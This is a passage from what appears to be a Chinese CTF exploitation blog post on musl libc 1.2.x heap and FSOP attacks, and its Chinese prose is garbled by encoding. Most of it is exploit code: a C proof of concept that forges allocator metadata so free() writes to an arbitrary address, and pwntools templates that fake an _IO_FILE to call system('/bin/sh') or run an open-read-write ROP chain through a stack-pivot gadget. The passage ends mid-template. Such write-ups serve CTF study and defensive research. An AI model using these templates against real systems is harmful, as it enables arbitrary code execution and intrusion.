class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">uintptr_t</span> last_idx: <span class="number">5</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> freeable: <span class="number">1</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass: <span class="number">6</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> maplen: <span class="number">8</span> * <span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>) - <span class="number">12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> *<span class="title">ctx</span> =</span> (<span class="keyword">struct</span> malloc_context *) (&amp;<span class="built_in">printf</span> + <span class="number">0x247193</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">target</span> =</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *mmap_space = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">fake_meta_area</span> =</span> mmap_space;</span><br><span class="line">    fake_meta_area-&gt;check = ctx-&gt;secret;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">fake_meta</span> =</span> (<span class="keyword">struct</span> meta *) ((<span class="type">uint64_t</span>) mmap_space + <span class="number">0x100</span>);</span><br><span class="line">    fake_meta-&gt;maplen = <span class="number">1</span>;</span><br><span class="line">    fake_meta-&gt;sizeclass = size_to_class(FAKE_CHUNK_SIZE - IB);</span><br><span class="line">    fake_meta-&gt;last_idx = LAST_INDEX;</span><br><span class="line">    fake_meta-&gt;freeable = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">fake_group</span> =</span> (<span class="keyword">struct</span> group *) ((<span class="type">uint64_t</span>) mmap_space + <span class="number">0x1000</span>);</span><br><span class="line">    fake_meta-&gt;mem = fake_group;</span><br><span class="line">    fake_group-&gt;meta = fake_meta;</span><br><span class="line">    fake_meta-&gt;avail_mask = ((<span class="number">2U</span> &lt;&lt; LAST_INDEX) - <span class="number">1</span>) ^ (<span class="number">1</span> &lt;&lt; FAKE_CHUNK_INDEX);</span><br><span class="line">    fake_meta-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *fake_chunk = (<span class="type">uint8_t</span> *) ((<span class="type">uint64_t</span>) fake_group-&gt;storage + size_classes[fake_meta-&gt;sizeclass] * UNIT * FAKE_CHUNK_INDEX);</span><br><span class="line">    *(<span class="type">uint16_t</span> *) (fake_chunk - <span class="number">2</span>) = (fake_chunk - fake_group-&gt;storage) / UNIT;</span><br><span class="line">    fake_chunk[<span class="number">-3</span>] = FAKE_CHUNK_INDEX;</span><br><span class="line"></span><br><span class="line">    fake_meta-&gt;prev = fake_meta-&gt;next = &amp;target;</span><br><span class="line">    <span class="built_in">free</span>(fake_chunk);</span><br><span class="line">    assert(target.prev == target.next &amp;&amp; target.prev == &amp;target);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fsop"><a href="#fsop" class="headerlink" title="fsop"></a>fsop</h2><h3 id="IO-fileç»“æ„ä½“"><a href="#IO-fileç»“æ„ä½“" class="headerlink" title="IO_fileç»“æ„ä½“"></a>IO_fileç»“æ„ä½“</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line">    <span class="type">int</span> (*close)(FILE *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line">    <span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> buf_size;</span><br><span class="line">    FILE *prev, *next;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">int</span> pipe_pid;</span><br><span class="line">    <span class="type">long</span> lockcount;</span><br><span class="line">    <span class="type">int</span> mode;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line">    <span class="type">int</span> lbf;</span><br><span class="line">    <span class="type">void</span> *cookie;</span><br><span class="line">    <span class="type">off_t</span> off;</span><br><span class="line">    <span class="type">char</span> *getln_buf;</span><br><span class="line">    <span class="type">void</span> *mustbezero_2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line">    <span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">    FILE *prev_locked, *next_locked;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="exitåˆ©ç”¨é“¾"><a href="#exitåˆ©ç”¨é“¾" class="headerlink" title="exitåˆ©ç”¨é“¾"></a>exitåˆ©ç”¨é“¾</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="keyword">volatile</span> __stdin_used = &amp;__stdin_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stdout_used = &amp;__stdout_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stderr_used = &amp;__stderr_FILE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">_Noreturn</span> <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">    __funcs_on_exit();</span><br><span class="line">    __libc_exit_fini();</span><br><span class="line">    __stdio_exit();</span><br><span class="line">    _Exit(code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>) &#123;</span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">for</span> (f = *__ofl_lock(); f; f = f-&gt;next) close_file(f);</span><br><span class="line">    close_file(__stdin_used);</span><br><span class="line">    close_file(__stdout_used);</span><br><span class="line">    close_file(__stderr_used);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">    FFINALLOCK(f);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos - f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>exit</code>å‡½æ•°æœ€ç»ˆä¼šè°ƒç”¨åˆ°ä¸‰ä¸ª<code>io file</code>çš„<code>write</code>å‡½æ•°å’Œ<code>seek</code>å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å°† <code>FILE</code> ç»“æ„ä½“å¼€å¤´çš„å‡ ä¸ªå­—èŠ‚ä¿®æ”¹ä¸º <code>/bin/sh</code> ï¼Œå†ä¿®æ”¹ <code>write</code> æŒ‡é’ˆçš„å€¼ä¸º <code>system</code> ï¼Œä»¥åŠä¿®æ”¹ <code>f-&gt;wpos</code> ã€<code>f-&gt;wbase</code> ä¸­å…¶ä¸­ä¹‹ä¸€å°±å¯ä»¥è°ƒç”¨åˆ° <code>system(â€œ/bin/shâ€)</code><br>æ€»ç»“æ¥è¯´ï¼Œå°±æ˜¯åœ¨æ— æ²™ç®±æ—¶ï¼Œéœ€è¦ä¿®æ”¹ <code>_IO_FILE</code> ç»“æ„ä½“çš„å‡ ä¸ªåœ°æ–¹ï¼š</p><ul><li>èµ·å§‹ä½ç½®å†™å…¥ <code>/bin/sh</code></li><li><code>write</code> å†™å…¥ <code>system</code> å‡½æ•°åœ°å€ã€‚</li><li>å¥½å°† <code>lock</code> è®¾ç½®ä¸ºå°äº <code>0</code> é¿å…ç¨‹åºå¡æ­»åœ¨ <code>__lockfile</code> å‡½æ•°ä¸­ã€‚(ç­‰äº <code>0</code> è²Œä¼¼ä¹Ÿå¯ä»¥)</li></ul><p>fake_file getshellæ¨¡æ¿ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x1919810</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc_base+libc.symols[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br></pre></td></tr></table></figure><p>è‹¥éœ€è¦<code>orw</code>ï¼Œè¿™éœ€è¦ä¸€ä¸‹<code>gadget</code>ï¼š</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br></pre></td></tr></table></figure><p>æ€»ç»“æ¥è¯´ï¼Œå°±æ˜¯åœ¨æœ‰æ²™ç®±æ—¶ï¼Œéœ€è¦ä¿®æ”¹ <code>_IO_FILE</code> ç»“æ„ä½“çš„ <code>3</code> ä¸ªåœ°æ–¹ï¼š</p><ul><li><code>f-&gt;wbase</code> å†™å…¥ç¬¬ä¸€ä¸ª <code>gadget</code> åœ°å€ä½¿å¾— <code>f-&gt;wpos ã€f-&gt;wbase</code> ä¸ç­‰çš„åŒæ—¶èƒ½å¤Ÿæ‰§è¡Œåˆ° <code>gadget</code></li><li><code>write</code> å†™å…¥åˆšæ‰æåˆ°çš„æ ˆè¿ç§»çš„ <code>gadget</code></li><li>åç§» <code>0x30</code> å¤„å†™å…¥æ–°çš„æ ˆåœ°å€é…åˆæ ˆè¿ç§» <code>gadget</code> å®Œæˆæ ˆè¿ç§»</li><li>æ­¤å¤–è¿˜éœ€è¦åœ¨å…¶ä»–åœ°æ–¹æ„é€ å¥½ <code>ROP</code> é“¾ç”¨äº <code>orw</code></li></ul><p>æ¨¡æ¿ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">payload_addr = libc.address - <span class="number">0x6fe0</span></span><br><span class="line">fake_file_addr = payload_addr</span><br><span class="line">fake_group_addr = fake_file_addr + <span class="number">0x90</span></span><br><span class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area_offset = ((payload_addr + <span class="number">0xFFF</span>) &amp; ~<span class="number">0xFFF</span>) - payload_addr</span><br><span class="line">fake_meta_offset = fake_meta_area_offset + <span class="number">8</span></span><br><span class="line">fake_meta_addr = payload_addr + fake_meta_offset</span><br><span class="line">stderr_used_addr = libc.address + <span class="number">0xb43a0</span></span><br><span class="line">rop_addr = fake_chunk_addr</span><br><span class="line"></span><br><span class="line">magic_gadget = libc.search(asm(<span class="string">&#x27;mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rax_ret = libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">ret = libc.search(asm(<span class="string">&quot;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">buf_addr = payload_addr</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(rop_addr)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(ret)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(magic_gadget)  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_file_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr_used_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b0000</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0b1110</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(leak_secret) + fake_meta</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += rop</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= fake_meta_area_offset</span><br><span class="line">payload = payload.ljust(fake_meta_area_offset, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_meta_area</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(<span class="number">4</span>)  <span class="comment"># id</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># name -&gt; fake chunk</span></span><br><span class="line">fake_node += p64(<span class="number">0x100</span>)  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">2</span>)  <span class="comment"># type</span></span><br><span class="line">fake_node += p64(<span class="number">0xdeadbeef</span>)  <span class="comment"># fa</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># ls</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># rs</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, fake_node)</span><br><span class="line">add(<span class="number">6</span>, payload)</span><br></pre></td></tr></table></figure><h3 id="putsåˆ©ç”¨é“¾"><a href="#putsåˆ©ç”¨é“¾" class="headerlink" title="putsåˆ©ç”¨é“¾"></a>putsåˆ©ç”¨é“¾</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">puts</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span> &#123;</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    FLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    r = -(<span class="built_in">fputs</span>(s, <span class="built_in">stdout</span>) &lt; <span class="number">0</span> || putc_unlocked(<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) &lt; <span class="number">0</span>);</span><br><span class="line">    FUNLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fputs</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> l = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">return</span> (fwrite(s, <span class="number">1</span>, l, f) == l) - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *<span class="keyword">restrict</span> src, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> k, l = size * nmemb;</span><br><span class="line">    <span class="keyword">if</span> (!size) nmemb = <span class="number">0</span>;</span><br><span class="line">    FLOCK(f);</span><br><span class="line">    k = __fwritex(src, l, f);</span><br><span class="line">    FUNLOCK(f);</span><br><span class="line">    <span class="keyword">return</span> k == l ? nmemb : k / size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __towrite(FILE *f) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;flags &amp; F_NOWR) &#123;</span><br><span class="line">        f-&gt;flags |= F_ERR;</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> __fwritex(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">size_t</span> l, FILE *<span class="keyword">restrict</span> f) &#123;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!f-&gt;wend &amp;&amp; __towrite(f)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l &gt; f-&gt;wend - f-&gt;wpos) <span class="keyword">return</span> f-&gt;write(f, s, l);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getshell æ¨¡æ¿ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>orw musl-1.2.2 æ¨¡æ¿ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 